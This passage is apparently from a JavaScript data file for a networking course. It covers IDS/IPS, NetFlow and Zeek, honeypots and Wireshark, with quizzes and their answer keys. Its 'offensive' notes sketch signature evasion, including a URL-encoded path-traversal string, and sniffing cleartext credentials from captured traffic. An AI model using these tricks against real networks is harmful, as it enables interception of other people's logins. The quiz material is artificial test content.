        "concept": "- Intrusion Detection System (IDS): Passive out-of-band device connected to a switch SPAN port or network TAP.\n  - Sniffs traffic copies in Promiscuous Mode.\n  - Analyzes packets and generates alerts to the SIEM.\n  - ZERO latency impact on network traffic, but cannot prevent attacks in real time.\n- Intrusion Prevention System (IPS): Inline security appliance sitting physically in the path of packets (acting like a bridge).\n  - Inspects packets in real time.\n  - Can actively DROP malicious packets, reset TCP sessions, and ban attacking IP addresses.\n  - Slight latency impact; misconfigured rules (false positives) can accidentally drop legitimate business traffic.",
        "cyberLens": {
          "offensive": "IDS/IPS Evasion: Attackers use packet fragmentation, polymorphic shellcode, out-of-order delivery, and URL encoding (`%2e%2e%2f` for `../`) to evade static signatures.",
          "defensive": "Modern IPS engines use stream reassembly and protocol normalization before running signature and anomaly detection algorithms."
        },
        "keyPoints": [
          "IDS alerts after the fact; IPS blocks in real time.",
          "Signature-based catches known exploits; Anomaly-based catches zero-days.",
          "SPAN ports mirror traffic to IDS; IPS must sit inline."
        ],
        "quiz": {
          "question": "What is the primary operational risk of deploying an Intrusion Prevention System (IPS) in active inline blocking mode?",
          "options": [
            "It uses too much electrical power.",
            "A false positive rule can accidentally drop critical legitimate business traffic and disrupt business operations.",
            "It cannot inspect IP addresses.",
            "It turns off all computer screens."
          ],
          "answer": 1,
          "explanation": "Because an IPS sits directly inline and actively drops packets, a poorly tuned signature resulting in a false positive will block legitimate customer transactions or critical server communications."
        }
      },
      {
        "screenNumber": 3,
        "globalSource": 109,
        "title": "Network Telemetry: NetFlow, IPFIX, & Zeek",
        "summary": "Flow metadata vs full packet captures: scalable enterprise visibility.",
        "concept": "- Full Packet Capture (PCAP): Records every single byte over the wire (Wireshark/tcpdump). 100% visibility, but storing full PCAP at 10 Gbps requires terabytes of storage per day.\n- NetFlow / IPFIX: Exports connection summary metadata (the 'phone bill' of the network):\n  - Records: Src IP, Dst IP, Src Port, Dst Port, Protocol, Packet Count, Byte Count, Duration, Flags.\n  - 99% smaller storage footprint than PCAP, enabling months of searchable traffic history.\n- Zeek (formerly Bro): Bridges the gap by generating structured behavioral transaction logs for DNS, HTTP, SSL, and SSH without storing massive payload data.",
        "cyberLens": {
          "offensive": "Beaconing Detection: Malware C2 agents communicate on regular intervals (e.g., checking in every 60 seconds). Security analysts identify C2 beacons by querying NetFlow logs for recurring small-byte periodic flows.",
          "defensive": "NetFlow flow anomaly detection identifies massive sudden outbound data exfiltration in seconds."
        },
        "keyPoints": [
          "PCAP is the whole recording; NetFlow is the phone bill summary.",
          "NetFlow tracks who spoke to whom, when, and how much data was exchanged.",
          "Zeek extracts rich application-layer metadata from live streams."
        ],
        "quiz": {
          "question": "What key difference makes NetFlow/IPFIX telemetry more practical than full packet capture (PCAP) for multi-month network monitoring in large enterprises?",
          "options": [
            "NetFlow records only connection metadata (IPs, ports, byte counts) rather than raw payloads, requiring vastly less storage space.",
            "NetFlow works without electricity.",
            "PCAP cannot be opened on computers.",
            "NetFlow automatically fixes broken cables."
          ],
          "answer": 0,
          "explanation": "At high enterprise speeds, storing every packet payload (PCAP) exhausts storage within hours. NetFlow stores only the metadata summary (5-tuple, bytes, packets), allowing organizations to retain months of flow history."
        }
      },
      {
        "screenNumber": 4,
        "globalSource": 110,
        "title": "Deception Technology: Honeypots & Canary Tokens",
        "summary": "High-interaction vs Low-interaction honeypots, honeytokens, and active defense traps.",
        "concept": "Deception technology turns the network into a minefield for attackers:\n- Honeypot: A decoy system intentionally deployed with vulnerabilities and zero legitimate business function.\n  - Because legitimate employees have zero reason to ever touch it, ANY connection attempt to a honeypot is 100% guaranteed to be malicious!\n  - Low-Interaction (e.g. Cowrie, Dionaea): Emulates vulnerable services (SSH, SMB) to log credentials and malware samples.\n  - High-Interaction: Real VM running real OS in a heavily monitored, sandboxed containment network.\n- Canary Tokens: Decoy credentials or fake files with embedded tracking webhooks. If an attacker opens the file or uses the credentials, an immediate high-priority alert fires.",
        "cyberLens": {
          "offensive": "Honeypot Evasion: Attackers inspect system uptime, hardware MAC vendors, CPU thermal sensors, and registry keys to detect if they landed inside a virtualized honeypot sandbox before deploying their primary payload.",
          "defensive": "Scattering honeytokens (fake AWS keys, bogus database credentials in config files) creates high-fidelity tripwires that alert your SOC the instant an attacker starts enumerating files."
        },
        "keyPoints": [
          "Honeypots have zero false positives: any traffic touching them is suspicious.",
          "Canary tokens act as digital tripwires across endpoints and networks.",
          "Active defense shifts the asymmetric advantage from attacker to defender."
        ],
        "quiz": {
          "question": "Why do security operations centers (SOCs) value alerts triggered by Honeypots far more than standard IDS alerts?",
          "options": [
            "Because honeypots never send emails.",
            "Because honeypots have zero legitimate business use, so any traffic or connection attempt touching them has a near 0% false positive rate.",
            "Because honeypots are written in Python.",
            "Because honeypots automatically arrest the hacker."
          ],
          "answer": 1,
          "explanation": "Since legitimate users and systems have no business touching a honeypot, any activity on it is an immediate high-fidelity indicator of reconnaissance, compromise, or malicious scanning."
        }
      }
    ]
  },
  {
    "id": "23",
    "module": "05 / ENTERPRISE & DEFENCE",
    "title": "Wireshark: read your own traffic",
    "desc": "Bring the layers together using a small capture from your own local HTTP demo.",
    "screensCount": 4,
    "sourceRange": "SOURCE 111-114",
    "simulator": "wireshark-simulator",
    "badge": "Packet Forensics",
    "screens": [
      {
        "screenNumber": 1,
        "globalSource": 111,
        "title": "The Wireshark 3-Pane Architecture",
        "summary": "Mastering the Packet List, Packet Details tree, and Hex Dump view.",
        "concept": "Wireshark is the world's foremost network protocol analyzer, structured into three coordinated panes:\n1. Top Pane (Packet List): Displays all captured packets in chronological order (Packet #, Time, Source, Destination, Protocol, Length, Info summary).\n2. Middle Pane (Packet Details): Collapsible hierarchical tree dissecting the selected packet layer by layer (Frame -> Ethernet II -> IPv4 -> TCP/UDP -> Application Layer).\n3. Bottom Pane (Hex Dump): The raw binary bytes of the packet displayed in hexadecimal on the left and ASCII representation on the right. Clicking any field in the middle pane highlights the exact corresponding bytes in the hex dump!",
        "cyberLens": {
          "offensive": "Credential Harvesting: Sniffing local cleartext traffic (FTP, HTTP, Telnet) reveals usernames and passwords highlighted directly in the ASCII hex pane.",
          "defensive": "Digital Forensics: Analysts inspect the Hex Dump to extract embedded malware binaries, carving out malicious executable signatures (e.g. `MZ` header = 0x4D 0x5A)."
        },
        "keyPoints": [
          "The 3 panes coordinate: clicking a field in Details highlights its bytes in Hex.",
          "Packets are dissected strictly according to OSI/DoD protocol hierarchy.",
          "Colored packet rows indicate protocols (TCP=light purple, UDP=light blue, DNS=light blue, Errors=black/red)."
        ],
        "quiz": {
          "question": "What happens in Wireshark when you click on a specific header field (such as Time to Live) in the middle Packet Details pane?",
          "options": [
            "Wireshark deletes the packet.",
            "The corresponding exact raw hexadecimal and ASCII bytes are highlighted in the bottom Hex Dump pane.",
            "The router reboots.",
            "The packet is retransmitted onto the wire."
          ],
          "answer": 1,
          "explanation": "Wireshark synchronizes the panes: selecting any parsed field in the middle details tree immediately highlights the exact binary bytes representing that field in the bottom hex dump."
        }
      },
      {
        "screenNumber": 2,
        "globalSource": 112,
        "title": "Capture Filters vs Display Filters",
        "summary": "Berkeley Packet Filters (BPF) before capture vs post-capture analysis expressions.",
        "concept": "- Capture Filters (BPF - Berkeley Packet Filter syntax):\n  - Applied BEFORE packets are captured into memory by the libpcap/WinPcap driver.\n  - Reduces CPU and memory load on busy links.\n  - Syntax: `host 192.168.1.50 and port 80`, `not broadcast and not multicast`.\n  - Once dropped, discarded packets cannot be recovered.\n- Display Filters (Wireshark evaluation syntax):\n  - Applied AFTER packets are captured to filter what is shown on screen.\n  - Non-destructive: Hiding packets does not delete them.\n  - Syntax:\n    - `ip.addr == 192.168.1.1`\n    - `tcp.flags.syn == 1 && tcp.flags.ack == 0` (filters initial SYN packets)\n    - `http.request.method == \"POST\"`\n    - `dns.flags.response == 0` (DNS queries only).",
        "cyberLens": {
          "offensive": "Filtering Out Noise: In a multi-gigabyte capture, attackers and analysts quickly isolate targets using surgical display filters like `frame contains \"password\"`.",
          "defensive": "Threat hunting filters like `tcp.analysis.retransmission` detect link degradation, while `tcp.flags.reset == 1` finds terminated sessions."
        },
        "keyPoints": [
          "Capture filters drop before recording; display filters hide on screen.",
          "Green filter bar means valid syntax; red bar means syntax error.",
          "Display filters allow deep field-level Boolean logic (`&&`, `||`, `!`)."
        ],
        "quiz": {
          "question": "Which Wireshark display filter will isolate ONLY initial TCP SYN packets sent to start new connections (excluding SYN-ACK packets)?",
          "options": [
            "tcp.port == 80",
            "tcp.flags.syn == 1 && tcp.flags.ack == 0",
            "ip.proto == 6",
            "http"
          ],
          "answer": 1,
          "explanation": "Initial connection initiation packets have the SYN flag set (1) and the ACK flag cleared (0). SYN-ACK responses have both flags set."
        }
      },
      {
        "screenNumber": 3,
        "globalSource": 113,
        "title": "Following TCP Streams & Payload Reconstruction",
        "summary": "Reassembling scattered segments into human-readable conversations.",
        "concept": "A single web page or file download is fragmented across dozens or thousands of individual TCP packets.\n- Following TCP Stream (`Right Click Packet -> Follow -> TCP Stream`):\n  - Wireshark reassembles all out-of-order sequence numbers, strips lower-layer Ethernet/IP/TCP headers, and displays the complete bidirectional conversation in a single clean ASCII/Hex window.\n  - Text sent by Client is colored RED.\n  - Text sent by Server is colored BLUE.\n  - Perfect for viewing raw HTTP requests/responses, FTP credentials, and Telnet sessions as they happened in real time.",
        "cyberLens": {
          "offensive": "Credential Extraction: Right-clicking any HTTP POST packet and selecting 'Follow TCP Stream' immediately reveals plaintext submitted form fields (username, password, credit card) without needing to inspect individual packets.",
          "defensive": "Forensic reconstruction: Incident responders follow streams to reconstruct files dropped by malware or extract attacker commands executed in compromised webshells."
        },
        "keyPoints": [
          "Follow TCP Stream reassembles the full bidirectional byte stream.",
          "Red text is client outbound; Blue text is server inbound.",
          "Wireshark automatically assigns each unique TCP connection a stream index (`tcp.stream eq 0`)."
        ],
        "quiz": {
          "question": "When using Wireshark's 'Follow TCP Stream' feature, what do the Red and Blue colored texts represent by default?",
          "options": [
            "Red is corrupted packets, Blue is healthy packets.",
            "Red represents data sent from Client to Server; Blue represents data sent from Server to Client.",
            "Red is IPv4, Blue is IPv6.",
            "Red is encrypted, Blue is cleartext."
          ],
          "answer": 1,
          "explanation": "Wireshark uses Red for client requests (outbound from initiator) and Blue for server responses (inbound return), making conversational flow effortless to read."
        }
      },
      {
        "screenNumber": 4,
        "globalSource": 114,
        "title": "Bringing It All Together: The Ultimate PCAP Investigation",
        "summary": "Correlating Layer 2 ARP, Layer 3 Routing, Layer 4 TCP handshakes, and Layer 7 Application data.",
        "concept": "In this final capstone screen, we correlate an entire real-world network incident through the lens of all 23 chapters:\n1. ARP resolution: Host discovers gateway MAC (Ch 07).\n2. DNS Query: Host resolves `bank-login.com` to public IP (Ch 16).\n3. Routing & NAT: Packet leaves local subnet, translates via PAT (Ch 08-11).\n4. TCP 3-Way Handshake: SYN -> SYN-ACK -> ACK synchronizes ISNs (Ch 12-13).\n5. TLS 1.3 Negotiation: Client Hello, Server Hello, ECDHE shared secret (Ch 15).\n6. HTTP Application Request: Encrypted GET with cookie and security headers (Ch 17-18).\n7. Defense Inspection: Firewall and IDS inspect telemetry, validating against threat intelligence (Ch 21-22).\nYou now understand every layer of computing from electrical bits on copper to application session tokens!",
        "cyberLens": {
          "offensive": "A cybersecurity professional who understands the full network stack can spot anomalies that automated tools miss, construct stealthy exploits, and penetrate deep corporate architectures.",
          "defensive": "A master network defender can trace an incident from a single SIEM alert back to the exact packet offset, reverse the attack, patch the vulnerability, and protect global infrastructure."
        },
        "keyPoints": [
          "Networking is the foundational language of cybersecurity.",
          "Every cyber incident leaves an immutable record on the wire.",
          "Mastery of these 23 chapters provides the complete foundation for any security career."
        ],
        "quiz": {
          "question": "What is the single most definitive source of truth during a digital forensic incident investigation when host logs have been deleted by an attacker?",
          "options": [
            "The attacker's confession.",
            "Raw Network Packet Captures (PCAPs) captured out-of-band on network taps and core switches.",
            "The computer wallpaper.",
            "A reboot of the router."
          ],
          "answer": 1,
          "explanation": "Attackers can wipe Windows Event Logs and delete bash history on a compromised endpoint, but they cannot delete raw packets captured out-of-band by physical network TAPs or switch SPAN ports."
        }
      }
    ]
  }
];
  if (typeof module !== 'undefined' && module.exports) {
    module.exports = root.NETWORKING_STUDIO_CHAPTERS;
  }
})();
